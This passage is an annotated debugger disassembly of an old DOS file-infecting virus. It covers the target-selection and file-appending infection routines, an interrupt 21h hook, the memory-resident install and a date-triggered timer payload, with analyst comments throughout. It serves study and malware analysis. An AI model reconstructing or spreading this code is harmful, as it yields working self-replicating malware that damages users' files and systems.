                        ; if so, terminate the search operation
                        ;

1E72:2863 BE5C01        MOV	SI,015C                            
1E72:2866 BFA801        MOV	DI,01A8                            
1E72:2869 E893FF        CALL	strcmp                               
1E72:286C 7501          JNZ	286F                               
1E72:286E C3            RET	                                   

                        ;
                        ; remember current search pattern
                        ;

1E72:286F BE5C01        MOV	SI,015C                            
1E72:2872 BFA801        MOV	DI,01A8                            
1E72:2875 E880FF        CALL	strcpy                               

1E72:2878 BE5C01        MOV	SI,015C                            
1E72:287B BFF401        MOV	DI,01F4                            
1E72:287E E877FF        CALL	strcpy                               

                        ;
                        ; get current disk transfer address and store it     
                        ;

1E72:2881 06            PUSH	ES                                 
1E72:2882 B42F          MOV	AH,2F                              
1E72:2884 E87902        CALL	int21                   
1E72:2887 891E2001      MOV	[0120],BX                     
1E72:288B 8C062201      MOV	[0122],ES                          
1E72:288F 07            POP	ES                                 

                        ;
                        ; set private disk transfer address             
                        ;

1E72:2890 B41A          MOV	AH,1A                              
1E72:2892 BA2401        MOV	DX,0124
1E72:2895 E86802        CALL	int21
                               
1E72:2898 E81400        CALL	28AF                               

                        ;
                        ; restore original disk transfer address and return
                        ;

1E72:289B 1E            PUSH	DS                                 
1E72:289C B41A          MOV	AH,1A                              
1E72:289E C5162001      LDS	DX,[0120]                          
1E72:28A2 E85B02        CALL	int21                               
1E72:28A5 1F            POP	DS                                 
1E72:28A6 C3            RET	                                   

                        ;
                        ; search the next file, because we found one, we dont
                        ; like  
                        ;

1E72:28A7 B44F          MOV	AH,4F                              
1E72:28A9 E85402        CALL	int21                               
1E72:28AC 730E          JNB	28BC                  ; if ok continue, 
                                                      ; otherwise return
              
1E72:28AE C3            RET	                                   

                        ;
                        ; the following is called with 015c containing the
                        ; search pattern, which is copied to 01a8 and 01f4
                        ; too.
                        ;

1E72:28AF B44E          MOV	AH,4E                              
1E72:28B1 BA5C01        MOV	DX,015C                            
1E72:28B4 B92000        MOV	CX,0020                            
1E72:28B7 E84602        CALL	int21                 ; find match file             
1E72:28BA 72F2          JB	28AE                  ; return on error             

                        ; 
                        ; find first/next was ok. test if we want this file
                        ;

1E72:28BC BE4201        MOV	SI,0142                            
1E72:28BF BF4402        MOV	DI,0244                            
1E72:28C2 E83AFF        CALL	strcmp                               
1E72:28C5 74E0          JZ	28A7                  ; dont like COMMAND.COM             
1E72:28C7 833E400100    CMP	WORD PTR [0140],+00                
1E72:28CC 75D9          JNZ	28A7                  ; dont like files with
                                                      ; high size != 0

1E72:28CE 813E3E011DF2  CMP	WORD PTR [013E],F21D               
1E72:28D4 77D1          JA	28A7                  ; dont like files bigger
                                                      ; than f21d bytes. this
                                                      ; is de3 bytes less than
                                                      ; 10000. this could be
                                                      ; the size of
                                                      ; the virus plus some
                                                      ; reserve.

1E72:28D6 BA0000        MOV	DX,0000                            
1E72:28D9 A13E01        MOV	AX,[013E]                          
1E72:28DC BB3300        MOV	BX,0033                            
1E72:28DF F7F3          DIV	BX                                 
1E72:28E1 83FA00        CMP	DX,+00                             
1E72:28E4 74C1          JZ	28A7                  ; dont like files whose
                                                      ; size is divideable by             
                                                      ; 33 (51 dec) without a
                                                      ; reminder.

                        ;
                        ; now we construct a name of a file using the search
                        ; pattern given in 01F4.
                        ;
1E72:28E6 BFF401        MOV	DI,01F4                            
1E72:28E9 B000          MOV	AL,00                              
1E72:28EB B94B00        MOV	CX,004B                            
1E72:28EE F2            REPNZ	                                   
1E72:28EF AE            SCASB	                                   
                        ;
                        ; now di points to the 00 byte at the end of the 
                        ; string. scan backwards until the last path or a
                        ; drive separator is found.
                        ;
1E72:28F0 8A45FF        MOV	AL,[DI-01]                         
1E72:28F3 3C3A          CMP	AL,':'                              
1E72:28F5 7407          JZ	28FE                               
1E72:28F7 3C5C          CMP	AL,'\'                              
1E72:28F9 7403          JZ	28FE                               
1E72:28FB 4F            DEC	DI                                 
1E72:28FC EBF2          JMP	28F0                               
                        ;
                        ; now append the name of the found file
                        ;
1E72:28FE BE4201        MOV	SI,0142                            
1E72:2901 E8F4FE        CALL	strcpy                               
                        ;
1E72:2904 B8023D        MOV	AX,3D02                            
1E72:2907 BAF401        MOV	DX,01F4                            
1E72:290A E8F301        CALL	int21                 ; open file for rw              
1E72:290D 729F          JB	28AE                  ; return on error             
                        ;
                        ; read the first 4 bytes of the file.
                        ;
1E72:290F 8BD8          MOV	BX,AX                              
1E72:2911 B43F          MOV	AH,3F                              
1E72:2913 BA4F01        MOV	DX,014F                            
1E72:2916 B90400        MOV	CX,0004                            
1E72:2919 E8E401        CALL	int21                               
1E72:291C 7303          JNB	2921                               
1E72:291E E9C000        JMP	29E1                  ; error while reading
                                                      ; the file header 
                                                      ; occured. stop 
                                                      ; infection after 
                                                      ; resetting the files
                                                      ; attributes
1E72:2921 803E4F01FF    CMP	BYTE PTR [014F],FF                 
1E72:2926 740E          JZ	2936                  ; files starting with
                                                      ; FF dont become 
                                                      ; infected
1E72:2928 803E4F01E9    CMP	BYTE PTR [014F],E9             
1E72:292D 7510          JNZ	293F                  ; files not starting
                                                      ; with E9 become 
                                                      ; infected                 
1E72:292F 803E5201F1    CMP	BYTE PTR [0152],F1                 
1E72:2934 7509          JNZ	293F                  ; files without F1 in
                                                      ; byte 4 become 
                                                      ; infected

1E72:2936 E8A800        CALL	29E1                  ; close the file and
                                                      ; retain its attributes
1E72:2939 A2A801        MOV	[01A8],AL             ; put in drive letter
                                                      ; again...
1E72:293C E968FF        JMP	28A7                  ; search next file             

                        ;
                        ; when we come here, we are going to infect a file
                        ;

1E72:293F A14F01        MOV	AX,[014F]             ; copy the 4 bytes for
                                                      ; the header             
1E72:2942 A30301        MOV	[0103],AX             
1E72:2945 A15101        MOV	AX,[0151]                          
1E72:2948 A30501        MOV	[0105],AX                          

1E72:294B A13E01        MOV	AX,[013E]                          
1E72:294E 2D0300        SUB	AX,0003                            
1E72:2951 C6064F01E9    MOV	BYTE PTR [014F],E9    ; store jmp instruction             
1E72:2956 A35001        MOV	[0150],AX                          
1E72:2959 C6065201F1    MOV	BYTE PTR [0152],F1    ; store magic byte             
1E72:295E B80042        MOV	AX,4200                            
1E72:2961 B90000        MOV	CX,0000                            
1E72:2964 BA0000        MOV	DX,0000                            
1E72:2967 E89601        CALL	int21                 ; seek to the beginning
                                                      ; of the file
1E72:296A 7303          JNB	296F                               
1E72:296C EB73          JMP	29E1                  ; oops, close it             
1E72:296E 90            NOP	                                   
1E72:296F B440          MOV	AH,40                              
1E72:2971 BA4F01        MOV	DX,014F                            
1E72:2974 B90400        MOV	CX,0004                            
1E72:2977 E88601        CALL	int21                 ; write new header              
1E72:297A 7303          JNB	297F                               
1E72:297C EB63          JMP	29E1                  ; oops, close it             
1E72:297E 90            NOP	                                   
1E72:297F B80242        MOV	AX,4202                            
1E72:2982 B90000        MOV	CX,0000                            
1E72:2985 BA0000        MOV	DX,0000                            
1E72:2988 E87501        CALL	int21                  ; move to end of file             
1E72:298B 7303          JNB	2990                               
1E72:298D EB52          JMP	29E1                   ; oops, close file and
                                                       ; and return
1E72:298F 90            NOP	                                   

                        ;
                        ; now we are ready to append the virus code to the
                        ; file.
                        ;
1E72:2990 53            PUSH	BX                    ; save handle            
1E72:2991 BA0000        MOV	DX,0000                            
1E72:2994 A13E01        MOV	AX,[013E]             ; get low size of file            
1E72:2997 B9C40A        MOV	CX,0AC4                            
1E72:299A 03C1          ADD	AX,CX                 ; add size of virus
1E72:299C BB3300        MOV	BX,0033                            
1E72:299F F7F3          DIV	BX                                 
1E72:29A1 83C133        ADD	CX,+33                ; add modulo bytes             
1E72:29A4 2BCA          SUB	CX,DX                 ; subtract reminder. now
                                                      ; cx is the size of the
                                                      ; virus plus the number
                                                      ; of junk bytes, needed
                                                      ; to make the final size
                                                      ; of the file divideable
                                                      ; by 33.
                                                     
1E72:29A6 5B            POP	BX                    ; restore handle             
1E72:29A7 B440          MOV	AH,40                 ; write to file/device             
1E72:29A9 BA0001        MOV	DX,0100               ; source is ds:dx
1E72:29AC E85101        CALL	int21                 ; call dos   
1E72:29AF 7204          JB	29B5                  ; test error 
1E72:29B1 3BC1          CMP	AX,CX                 ; all written ?
1E72:29B3 742C          JZ	29E1                  ; yes, close file and
                                                      ; retain its attributes
                        ;
                        ; a write error occured
                        ;
1E72:29B5 B80042        MOV	AX,4200                            
1E72:29B8 B90000        MOV	CX,0000                            
1E72:29BB BA0000        MOV	DX,0000                            
1E72:29BE E83F01        CALL	int21                  ; seek to beginning             

1E72:29C1 B440          MOV	AH,40                              
1E72:29C3 BA0301        MOV	DX,0103                            
1E72:29C6 B90400        MOV	CX,0004                            
1E72:29C9 E83401        CALL	int21                  ; write original header

1E72:29CC B80042        MOV	AX,4200                            
1E72:29CF 8B0E4001      MOV	CX,[0140]                          
1E72:29D3 8B163E01      MOV	DX,[013E]                          
1E72:29D7 E82601        CALL	int21                  ; seek to the original
                                                       ; end of the file

1E72:29DA E81000        CALL	29ED                   ; close file & set its
                                                       ; attributes            
1E72:29DD A2F401        MOV	[01F4],AL                          
1E72:29E0 C3            RET	                                   
                        ;
                        ; subroutine to reset a files attributes after 
                        ; seeking to its end and closing it. this routine
                        ; returns the drive letter in al where ths file under
                        ; investigation was found.
                        ;
1E72:29E1 B80242        MOV	AX,4202                            
1E72:29E4 B90000        MOV	CX,0000                            
1E72:29E7 BA0000        MOV	DX,0000                            
1E72:29EA E81301        CALL	int21                  ; seek to eof             

                        ;
                        ; soubroutine to reset a files attributes to values
                        ; stored in the dta. they were filled up by the
                        ; search first/search next operations
                        ;

1E72:29ED 8B0E3A01      MOV	CX,[013A]                          
1E72:29F1 8B163C01      MOV	DX,[013C]                          
1E72:29F5 B80157        MOV	AX,5701                            
1E72:29F8 E80501        CALL	int21                  ; set date and time             
1E72:29FB B43E          MOV	AH,3E                              
1E72:29FD E80001        CALL	int21                  ; close file             
1E72:2A00 B80143        MOV	AX,4301                            
1E72:2A03 BAF401        MOV	DX,01F4                            
1E72:2A06 8A0E3901      MOV	CL,[0139]                          
1E72:2A0A B500          MOV	CH,00                              
1E72:2A0C E8F100        CALL	int21                  ; set attributes             
1E72:2A0F B020          MOV	AL,20                              
1E72:2A11 8606A801      XCHG	AL,[01A8]                          
1E72:2A15 C3            RET	                                   

                        ;
                        ; this is the dos int 21 interposer.
                        ;

1E72:2A16 9C            PUSHF	                                   
1E72:2A17 3DE033        CMP	AX,33E0               ; special installation
                                                      ; test.             
1E72:2A1A 7504          JNZ	2A20                               
1E72:2A1C B0E0          MOV	AL,E0                 ; return e0 instead of
                                                      ; the dos value ff for
                                                      ; this invalid call
1E72:2A1E 9D            POPF	                                   
1E72:2A1F CF            IRET	                                   

1E72:2A20 9D            POPF	                                   
1E72:2A21 9C            PUSHF	                                   
1E72:2A22 50            PUSH	AX                                 
1E72:2A23 53            PUSH	BX                                 
1E72:2A24 51            PUSH	CX                                 
1E72:2A25 52            PUSH	DX                                 
1E72:2A26 56            PUSH	SI                                 
1E72:2A27 57            PUSH	DI                                 
1E72:2A28 55            PUSH	BP                                 
1E72:2A29 1E            PUSH	DS                                 
1E72:2A2A 06            PUSH	ES                                 
1E72:2A2B 80FC31        CMP	AH,31                 ; keep process             
1E72:2A2E 743F          JZ	2A6F                               
1E72:2A30 80FC00        CMP	AH,00                 ; terminate             
1E72:2A33 7447          JZ	2A7C                               
1E72:2A35 80FC4C        CMP	AH,4C                 ; terminate             
1E72:2A38 7442          JZ	2A7C                               
1E72:2A3A 80FC39        CMP	AH,39                 ; create dir             
1E72:2A3D 744D          JZ	2A8C                               
1E72:2A3F 80FC3A        CMP	AH,3A                 ; remove dir             
1E72:2A42 7448          JZ	2A8C                               
1E72:2A44 80FC3C        CMP	AH,3C                 ; create file             
1E72:2A47 7443          JZ	2A8C                               
1E72:2A49 3D013D        CMP	AX,3D01               ; open for writing             
1E72:2A4C 743E          JZ	2A8C                               
1E72:2A4E 80FC41        CMP	AH,41                 ; delete file             
1E72:2A51 7439          JZ	2A8C                               
1E72:2A53 80FC43        CMP	AH,43                 ; change attributes             
1E72:2A56 7434          JZ	2A8C                               
1E72:2A58 80FC56        CMP	AH,56                 ; move directory entry             
1E72:2A5B 742F          JZ	2A8C                               
1E72:2A5D 80FC13        CMP	AH,13                 ; delete file (FCB)             
1E72:2A60 743D          JZ	2A9F                               
1E72:2A62 80FC16        CMP	AH,16                 ; create file (FCB)             
1E72:2A65 7438          JZ	2A9F                               
1E72:2A67 80FC17        CMP	AH,17                 ; rename file (FCB)             
1E72:2A6A 7433          JZ	2A9F                               
1E72:2A6C EB22          JMP	2A90                               
1E72:2A6E 90            NOP	                                   

1E72:2A6F 2E            CS:	                                   
1E72:2A70 803E500200    CMP	BYTE PTR [0250],00                 
1E72:2A75 7519          JNZ	2A90                               
1E72:2A77 8AD8          MOV	BL,AL                              
1E72:2A79 EB43          JMP	2ABE                               
1E72:2A7B 90            NOP	                                   

                        ;
                        ; this routine is interposed on terminate calls
                        ;

1E72:2A7C 2E            CS:	                                   
1E72:2A7D 803E500200    CMP	BYTE PTR [0250],00                 
1E72:2A82 750C          JNZ	2A90                               
1E72:2A84 BA0000        MOV	DX,0000                            
1E72:2A87 8AD8          MOV	BL,AL                              
1E72:2A89 EB33          JMP	2ABE                               
1E72:2A8B 90            NOP	                                   

                        ;
                        ; this function is interposed on handle oriented
                        ; file io calls
                        ;

1E72:2A8C FB            STI	                                   
1E72:2A8D E8A4FD        CALL	2834                               

                        ;
                        ; here we come to resume the old dos entry point
                        ;

1E72:2A90 07            POP	ES                                 
1E72:2A91 1F            POP	DS                                 
1E72:2A92 5D            POP	BP                                 
1E72:2A93 5F            POP	DI                                 
1E72:2A94 5E            POP	SI                                 
1E72:2A95 5A            POP	DX                                 
1E72:2A96 59            POP	CX                                 
1E72:2A97 5B            POP	BX                                 
1E72:2A98 58            POP	AX                                 
1E72:2A99 9D            POPF	                                   
1E72:2A9A 2E            CS:	                                   
1E72:2A9B FF2E0C01      JMP	FAR [010C]                         

                        ;
                        ; this routine is interposed on delete, create and 
                        ; rename functions related to FCB's 
                        ;

1E72:2A9F FB            STI	                                   
1E72:2AA0 E869FD        CALL	280C                               
1E72:2AA3 EBEB          JMP	2A90                               
                        ;
                        ; the next function is the dos terminate and stay 
                        ; resident interrupt (int 27) interposer.
                        ;
                        ; become resident with given number of bytes in
                        ; dx. this size is rounded to paragraphs. retain
                        ; exit code given on entry in al.
                        ;

1E72:2AA5 83C406        ADD	SP,+06                             
1E72:2AA8 D1EA          SHR	DX,1                               
1E72:2AAA D1EA          SHR	DX,1                               
1E72:2AAC D1EA          SHR	DX,1                               
1E72:2AAE D1EA          SHR	DX,1                               
1E72:2AB0 42            INC	DX                                 
1E72:2AB1 8AD8          MOV	BL,AL                              
1E72:2AB3 EB09          JMP	2ABE                  ; goto common code             
1E72:2AB5 90            NOP	                                   

                        ;
                        ; the next function is the interposer for the
                        ; interrupt 20, terminate program
                        ;
                        ; terminate with exit code 0 and no paragraphs to
                        ; be retained
                        ;

1E72:2AB6 83C406        ADD	SP,+06                             
1E72:2AB9 BA0000        MOV	DX,0000                            
1E72:2ABC B300          MOV	BL,00                              

                        ;
                        ; common code follows
                        ;

1E72:2ABE B80000        MOV	AX,0000               ; make interrupt vector
                                                      ; table addressable             
1E72:2AC1 8ED8          MOV	DS,AX                              

1E72:2AC3 2E            CS:	                      ; set vector 20             
1E72:2AC4 A11401        MOV	AX,[0114]                          
1E72:2AC7 A38000        MOV	[0080],AX                          
1E72:2ACA 2E            CS:	                                   
1E72:2ACB A11601        MOV	AX,[0116]                          
1E72:2ACE A38200        MOV	[0082],AX                          

1E72:2AD1 2E            CS:	                      ; set vector 27             
1E72:2AD2 A11001        MOV	AX,[0110]                          
1E72:2AD5 A39C00        MOV	[009C],AX                          
1E72:2AD8 2E            CS:	                                   
1E72:2AD9 A11201        MOV	AX,[0112]                          
1E72:2ADC A39E00        MOV	[009E],AX                          

1E72:2ADF 2E            CS:	                                   
1E72:2AE0 C606500201    MOV	BYTE PTR [0250],01                 
1E72:2AE5 FB            STI	                                   

1E72:2AE6 B8C40B        MOV	AX,0BC4               ; get a fixed area              
1E72:2AE9 D1E8          SHR	AX,1                               
1E72:2AEB D1E8          SHR	AX,1                               
1E72:2AED D1E8          SHR	AX,1                               
1E72:2AEF D1E8          SHR	AX,1                               
1E72:2AF1 40            INC	AX                                 
1E72:2AF2 03D0          ADD	DX,AX                              
1E72:2AF4 B80031        MOV	AX,3100                            
1E72:2AF7 8AC3          MOV	AL,BL                 ; restore exit code             
1E72:2AF9 9C            PUSHF	                                   
1E72:2AFA FA            CLI	                                   
1E72:2AFB 2E            CS:	                                   
1E72:2AFC FF1E0C01      CALL	FAR [010C]            ; terminate and stay
                                                      ; resident. this call
                                                      ; does not return             
                        ;
                        ; the next routine is used to call dos for internal 
                        ; operations
                        ;

                int21:
1E72:2B00 9C            PUSHF	                                   
1E72:2B01 FA            CLI	                                   
1E72:2B02 2E            CS:	                                   
1E72:2B03 FF1E0C01      CALL	FAR [010C]                         
1E72:2B07 C3            RET	                                   

                        ;
                        ; here we enter during the start of a infected
                        ; program. the way to this location passes two
                        ; unconditional jmp instructions
                        ;
-u 2b08,2cf6 

1CF5:2B08 9C            PUSHF	                      ; save registers
1CF5:2B09 50            PUSH	AX                    
1CF5:2B0A 53            PUSH	BX                    
1CF5:2B0B 51            PUSH	CX                    
1CF5:2B0C 52            PUSH	DX                    
1CF5:2B0D 56            PUSH	SI                    
1CF5:2B0E 57            PUSH	DI                    
1CF5:2B0F 55            PUSH	BP                    
1CF5:2B10 1E            PUSH	DS                    
1CF5:2B11 06            PUSH	ES                    

                        ;
                        ; the call to the following dos function is always
                        ; invalid. if the virus is resident, the dos 
                        ; interrupt becomes interposed. this interposer
                        ; returns e0 in al for the following function.
                        ; the interposer can be found at location 2A16.
                        ;

1CF5:2B12 B8E033        MOV	AX,33E0               ; ctrl-c check (?)
1CF5:2B15 CD21          INT	21                    

1CF5:2B17 3CFF          CMP	AL,FF                 
1CF5:2B19 7423          JZ	2B3E                  ; if error -> 2b3e. this
                                                      ; means the virus is not
                                                      ; jet installed.

1CF5:2B1B 8CCE          MOV	SI,CS                 ; move in code segment
1CF5:2B1D 8EC6          MOV	ES,SI                 
1CF5:2B1F 8B360101      MOV	SI,[0101]             ; get offset for jmp.
1CF5:2B23 81C60601      ADD	SI,0106               ; find saved code
1CF5:2B27 B90400        MOV	CX,0004               ; restore first 4 bytes
1CF5:2B2A BF0001        MOV	DI,0100               ; move to 100
1CF5:2B2D F3            REPZ	                      
1CF5:2B2E A4            MOVSB	                      ; move it

1CF5:2B2F 07            POP	ES                    ; restore registers
1CF5:2B30 1F            POP	DS                    
1CF5:2B31 5D            POP	BP                    
1CF5:2B32 5F            POP	DI                    
1CF5:2B33 5E            POP	SI                    
1CF5:2B34 5A            POP	DX                    
1CF5:2B35 59            POP	CX                    
1CF5:2B36 5B            POP	BX                    
1CF5:2B37 58            POP	AX                    
1CF5:2B38 9D            POPF	                      

1CF5:2B39 BD0001        MOV	BP,0100               
1CF5:2B3C FFE5          JMP	BP                    ; jump to old entry

                        ;
                        ; if we come here, we may assume the virus is not jet
                        ; installed
                        ;

1CF5:2B3E B104          MOV	CL,04                 
1CF5:2B40 8CC8          MOV	AX,CS                 

1CF5:2B42 BEE30A        MOV	SI,0AE3               ; get size of the 
                                                      ; resident part of the
                                                      ; virus
1CF5:2B45 D3EE          SHR	SI,CL                 
1CF5:2B47 46            INC	SI                    ; si seems to be a the
                                                      ; paragraph count
1CF5:2B48 BFFFFF        MOV	DI,FFFF               
1CF5:2B4B D3EF          SHR	DI,CL                 
1CF5:2B4D 47            INC	DI                    ; di is always (?) 1000

1CF5:2B4E 03C6          ADD	AX,SI                 
1CF5:2B50 03C7          ADD	AX,DI                 
1CF5:2B52 03C7          ADD	AX,DI                 
1CF5:2B54 40            INC	AX                    ; sum up, but what ? i
                                                      ; assume the virus lets
                                                      ; installs only if there
                                                      ; are (2000+X+a few)
                                                      ; paragraphs left. X is
                                                      ; the amount of 
                                                      ; paragraphs needed by 
                                                      ; the virus
1CF5:2B55 2E            CS:	                      
1CF5:2B56 3B060200      CMP	AX,[0002]             ; in cs:[0002] we find
                                                      ; the segment adrs of
                                                      ; the top of the memory

1CF5:2B5A 73BF          JNB	2B1B                  ; enter original program

1CF5:2B5C 07            POP	ES                    ; restore registers
1CF5:2B5D 1F            POP	DS                    
1CF5:2B5E 5D            POP	BP                    
1CF5:2B5F 5F            POP	DI                    
1CF5:2B60 5E            POP	SI                    
1CF5:2B61 5A            POP	DX                    
1CF5:2B62 59            POP	CX                    
1CF5:2B63 5B            POP	BX                    
1CF5:2B64 58            POP	AX                    
1CF5:2B65 9D            POPF	                      

1CF5:2B66 8BE8          MOV	BP,AX                 ; ax contains the info
                                                      ; whether the drives
                                                      ; given on the 
                                                      ; commandline are valid

1CF5:2B68 E9E600        JMP	2C51                  ; jump to install 
                                                      ; routine

1CF5:2B6B 8BC5          MOV	AX,BP                 
1CF5:2B6D 2E            CS:	                      
1CF5:2B6E 8E160A01      MOV	SS,[010A]             
1CF5:2B72 BC0000        MOV	SP,0000               
1CF5:2B75 2E            CS:	                      
1CF5:2B76 8E1E0A01      MOV	DS,[010A]             
1CF5:2B7A 2E            CS:	                      
1CF5:2B7B 8E060A01      MOV	ES,[010A]             
1CF5:2B7F BD0000        MOV	BP,0000               
1CF5:2B82 55            PUSH	BP                    

1CF5:2B83 9C            PUSHF	                      
1CF5:2B84 50            PUSH	AX                    
1CF5:2B85 53            PUSH	BX                    
1CF5:2B86 51            PUSH	CX                    
1CF5:2B87 52            PUSH	DX                    
1CF5:2B88 56            PUSH	SI                    
1CF5:2B89 57            PUSH	DI                    
1CF5:2B8A 55            PUSH	BP                    
1CF5:2B8B 1E            PUSH	DS                    
1CF5:2B8C 06            PUSH	ES                    
1CF5:2B8D FB            STI	                      

                        ;
                        ; the nex section of code saves the contents of some
                        ; interrupt vectors
                        ;

1CF5:2B8E B80000        MOV	AX,0000               ; use data segment 0
1CF5:2B91 8ED8          MOV	DS,AX                 

1CF5:2B93 C43E8000      LES	DI,[0080]             ; get int 20 (terminate)
1CF5:2B97 2E            CS:	                      
1CF5:2B98 893E1401      MOV	[0114],DI             ; store it to [114-117]
1CF5:2B9C 2E            CS:	                      
1CF5:2B9D 8C061601      MOV	[0116],ES             

1CF5:2BA1 C43E2000      LES	DI,[0020]             ; get int 8 (timer)
1CF5:2BA5 2E            CS:	                      
1CF5:2BA6 893E1C01      MOV	[011C],DI             ; store it to [11c-11f]
1CF5:2BAA 2E            CS:	                      
1CF5:2BAB 8C061E01      MOV	[011E],ES             

1CF5:2BAF C43E8400      LES	DI,[0084]             ; get int 21 (dos)
1CF5:2BB3 2E            CS:	                      
1CF5:2BB4 893E0C01      MOV	[010C],DI             ; store it to [10c-10f]
1CF5:2BB8 2E            CS:	                      
1CF5:2BB9 8C060E01      MOV	[010E],ES             

1CF5:2BBD C43E9C00      LES	DI,[009C]             ; get int 27 (tbsr)
1CF5:2BC1 2E            CS:	                      
1CF5:2BC2 893E1001      MOV	[0110],DI             ; store it to [110-113]
1CF5:2BC6 2E            CS:	                      
1CF5:2BC7 8C061201      MOV	[0112],ES             

                        ;
                        ; the next section sets up some interrupt vectors
                        ;

1CF5:2BCB FA            CLI	                      
1CF5:2BCC C70680008E09  MOV	WORD PTR [0080],098E  ; set int 20 (terminate)
1CF5:2BD2 8C0E8200      MOV	[0082],CS             
1CF5:92BD6 C7069C007D09  MOV	WORD PTR [009C],097D  ; set int 27 (tbsr)
1CF5:2BDC 8C0E9E00      MOV	[009E],CS             
1CF5:2BE0 C7068400EE08  MOV	WORD PTR [0084],08EE  ; set int 21 (dos)
1CF5:2BE6 8C0E8600      MOV	[0086],CS             
1CF5:2BEA FB            STI	                      

1CF5:2BEB 2E            CS:	                      
1CF5:2BEC 803E070100    CMP	BYTE PTR [0107],00    
1CF5:2BF1 744C          JZ	2C3F                  

1CF5:2BF3 B42A          MOV	AH,2A                 
1CF5:2BF5 CD21          INT	21                    ; get date
                                                      ; cx = year
                                                      ; dh = month
                                                      ; dl = day

1CF5:2BF7 81F9C307      CMP	CX,07C3               ; 7c3 == 1987 (dec)
1CF5:2BFB 720A          JB	2C07                  ; up to and including 
                                                      ; 1986 jump to 2c07

1CF5:2BFD 7710          JA	2C0F                  ; after 1896 jump to
                                                      ; 2c0f

1CF5:2BFF 81FA0105      CMP	DX,0501               
1CF5:2C03 730A          JNB	2C0F                  ; after 1.may jump to
                                                      ; 2c0f

1CF5:2C05 EB38          JMP	2C3F                  

1CF5:2C07 2E            CS:	                      
1CF5:2C08 803E070102    CMP	BYTE PTR [0107],02    
1CF5:2C0D 7230          JB	2C3F                  

                        ;
                        ; we jump to this label always after 1986. also we 
                        ; come here any jear before 1986 after the 1. of may,
                        ; which is a public holiday in germany
                        ;
                        ; the cx register still contains the year. this info
                        ; is used later to generate a pseudo random number
                        ;

1CF5:2C0F 1E            PUSH	DS                    
1CF5:2C10 B8FFFF        MOV	AX,FFFF               
1CF5:2C13 8ED8          MOV	DS,AX                 
1CF5:2C15 A00E00        MOV	AL,[000E]             ; ffff:000e contains the
                                                      ; machine type. this is
                                                      ; fc for an ibm pc/at
                                                      ; fd for an ibm pc/jr
                                                      ; fe for an ibm pc/xt
                                                      ; ff for an ibm pc    

                                                      ; by masking out, the
                                                      ; virus detects if its
                                                      ; running on an ibm
                                                      ; machine.
1CF5:2C18 24FC          AND	AL,FC                 
1CF5:2C1A 3CFC          CMP	AL,FC                 
1CF5:2C1C 1F            POP	DS                    

1CF5:2C1D 7520          JNZ	2C3F                  ; jump if this is not
                                                      ; an ibm machine
                        ;
                        ; in the next section a (pseudo-) random number is
                        ; generated in al. besides some memory locations
                        ; the current year is used for computations.

                        ; in 1 of 4 cases (ax bits 0 and 1
                        ; are zero) a new int 8 handler becomes established
                        ;

1CF5:2C1F A16C04        MOV	AX,[046C]             
1CF5:2C22 03066E04      ADD	AX,[046E]             
1CF5:2C26 35AA55        XOR	AX,55AA               
1CF5:2C29 D3C9          ROR	CX,CL                 
1CF5:2C2B 03C1          ADD	AX,CX                 
1CF5:2C2D 2403          AND	AL,03                 
1CF5:2C2F 3C00          CMP	AL,00                 
1CF5:2C31 750C          JNZ	2C3F                  

                        ;
                        ; the following is done only in 1/4 of all possible
                        ; cases
                        ;

1CF5:2C33 FA            CLI	                      ; replace int 8 (timer)
1CF5:2C34 C70620007A06  MOV	WORD PTR [0020],067A  
1CF5:2C3A 8C0E2200      MOV	[0022],CS             
1CF5:2C3E FB            STI	                      

1CF5:2C3F E896FB        CALL	27D8                  ; enable all data thats
                                                      ; necessary to play a 
                                                      ; tune

                        ;
                        ; the next section looks like it is returning to the 
                        ; old main program ?
                        ;

1CF5:2C42 07            POP	ES                    
1CF5:2C43 1F            POP	DS                    
1CF5:2C44 5D            POP	BP                    
1CF5:2C45 5F            POP	DI                    
1CF5:2C46 5E            POP	SI                    
1CF5:2C47 5A            POP	DX                    
1CF5:2C48 59            POP	CX                    
1CF5:2C49 5B            POP	BX                    
1CF5:2C4A 58            POP	AX                    
1CF5:2C4B 9D            POPF	                      
1CF5:2C4C 2E            CS:	                      
1CF5:2C4D FF2E0801      JMP	FAR [0108]            

                        ;
                        ; here we come when we are going to make the 
                        ; virus resident in main memory. bp contains the
                        ; value of the ax register it contained on program
                        ; start.
                        ;

1CF5:2C51 8CC8          MOV	AX,CS                 ; addressability
1CF5:2C53 8ED8          MOV	DS,AX                 
1CF5:2C55 8EC0          MOV	ES,AX                 

1CF5:2C57 8B1E0101      MOV	BX,[0101]             
1CF5:2C5B 81C30301      ADD	BX,0103               ; bx is offset to saved
                                                      ; code from original
                                                      ; file
1CF5:2C5F 8CC8          MOV	AX,CS                 
1CF5:2C61 BEE30A        MOV	SI,0AE3               
1CF5:2C64 03F3          ADD	SI,BX                 
1CF5:2C66 D1EE          SHR	SI,1                  
1CF5:2C68 D1EE          SHR	SI,1                  
1CF5:2C6A D1EE          SHR	SI,1                  
1CF5:2C6C D1EE          SHR	SI,1                  
1CF5:2C6E 46            INC	SI                    
1CF5:2C6F 03C6          ADD	AX,SI                 
1CF5:2C71 8BD0          MOV	DX,AX                 
1CF5:2C73 8ED2          MOV	SS,DX                 
1CF5:2C75 BCFEFF        MOV	SP,FFFE               
1CF5:2C78 B91F00        MOV	CX,001F               
1CF5:2C7B 8BF3          MOV	SI,BX                 
1CF5:2C7D 8BFB          MOV	DI,BX                 
1CF5:2C7F 81C7C40A      ADD	DI,0AC4               
1CF5:2C83 81C6A50A      ADD	SI,0AA5               
1CF5:2C87 FC            CLD	                      
1CF5:2C88 F3            REPZ	                      
1CF5:2C89 A4            MOVSB	                      
1CF5:2C8A 8BC3          MOV	AX,BX                 
1CF5:2C8C 05C40A        ADD	AX,0AC4               
1CF5:2C8F FFE0          JMP	AX                    

1CF5:2C91 8CC8          MOV	AX,CS                 
1CF5:2C93 BEC40B        MOV	SI,0BC4               
1CF5:2C96 D1EE          SHR	SI,1                  
1CF5:2C98 D1EE          SHR	SI,1                  
1CF5:2C9A D1EE          SHR	SI,1                  
1CF5:2C9C D1EE          SHR	SI,1                  
1CF5:2C9E 46            INC	SI                    
1CF5:2C9F 03C6          ADD	AX,SI                 
1CF5:2CA1 8EC0          MOV	ES,AX                 
1CF5:2CA3 8EDA          MOV	DS,DX                 
1CF5:2CA5 BE0000        MOV	SI,0000               
1CF5:2CA8 BF0000        MOV	DI,0000               
1CF5:2CAB 8BCB          MOV	CX,BX                 
1CF5:2CAD F3            REPZ	                      
1CF5:2CAE A4            MOVSB	                      
1CF5:2CAF 8CC8          MOV	AX,CS                 
